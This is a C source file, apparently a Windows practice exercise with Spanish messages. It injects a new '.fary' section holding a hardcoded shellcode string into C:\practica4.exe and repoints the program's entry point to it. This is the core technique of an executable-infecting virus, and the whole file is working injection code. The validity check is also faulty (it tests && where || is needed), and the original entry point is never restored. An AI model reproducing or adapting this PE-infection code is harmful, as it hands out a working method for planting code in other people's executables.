#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

DWORD align(DWORD number, DWORD alignment)
{
  if(number % alignment == 0)
    return number;
  else
    return (number / alignment) * alignment + alignment;
}

int main()
{
    char cadena[0x1000] = "\xE8\x00\x00\x00\x00\xE8\x00\x00\x00\x00\x5A\x81\xEA\x0A\x10\x40"\
    "\x00\x89\xD1\x81\xC1\x31\x10\x40\x00\xB8\x7B\x1D\x80\x7C\x51\xFF\xD0\x6A\x00\x6A"\
    "\x00\x6A\x00\x6A\x00\xB8\xEA\x07\x3D\x7E\xFF\xD0\xC3\x75\x73\x65\x72\x33\x32\x2E"\
    "\x64\x6C\x6C\x00";

    HANDLE hFile = CreateFileA("C:\\practica4.exe", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_WRITE | FILE_SHARE_READ, 0, OPEN_EXISTING, 0,0);
    DWORD tam = GetFileSize(hFile,0);

    HANDLE FileMap = CreateFileMapping(hFile, 0, PAGE_READWRITE, 0, tam+sizeof(cadena), 0);
    BYTE * Mapa = (BYTE*)MapViewOfFile(FileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0);

    printf("Mapa creado...\n");

    PIMAGE_DOS_HEADER IDH = (PIMAGE_DOS_HEADER)Mapa;
    if(Mapa[0] != 'M' && Mapa[1] != 'Z')
    {
        printf("Error, el archivo no es EXE\n");
        system("PAUSE");

        return 1;
    }

    PIMAGE_NT_HEADERS INTH = (PIMAGE_NT_HEADERS)&Mapa[IDH->e_lfanew];

    PIMAGE_SECTION_HEADER uSec = (PIMAGE_SECTION_HEADER)&Mapa[IDH->e_lfanew+sizeof(IMAGE_NT_HEADERS)+(sizeof(IMAGE_SECTION_HEADER)*(INTH->FileHeader.NumberOfSections-1))];

    printf("Leyendo Cabeceras...\n");

    PIMAGE_SECTION_HEADER nSec = uSec + 1 ;

    memset(nSec,0,sizeof(IMAGE_SECTION_HEADER));

    strcpy((char*)nSec->Name,".fary");
    nSec->VirtualAddress = align(uSec->VirtualAddress + uSec->Misc.VirtualSize, INTH->OptionalHeader.SectionAlignment);
    nSec->Misc.VirtualSize = sizeof(cadena);
    nSec->PointerToRawData = uSec->PointerToRawData + uSec->SizeOfRawData;
    nSec->SizeOfRawData = align(sizeof(cadena), INTH->OptionalHeader.FileAlignment);
    nSec->Characteristics = 0x60000020; //0xE0000060;

    printf("Rellenando seccion...\n");

    INTH->FileHeader.NumberOfSections += 1;
    INTH->OptionalHeader.SizeOfImage = align(nSec->VirtualAddress + nSec->Misc.VirtualSize, INTH->OptionalHeader.SectionAlignment);

    INTH->OptionalHeader.AddressOfEntryPoint = nSec->VirtualAddress;

    printf("Modificando valores del PE...\n");

    memcpy(&Mapa[nSec->PointerToRawData],cadena,sizeof(cadena));

    printf("Escribiendo seccion...\n");

    UnmapViewOfFile(Mapa);
    CloseHandle(FileMap);
    CloseHandle(hFile);

    printf("Seccion creada con exito!\n");
    system("PAUSE");

    return 0;
}

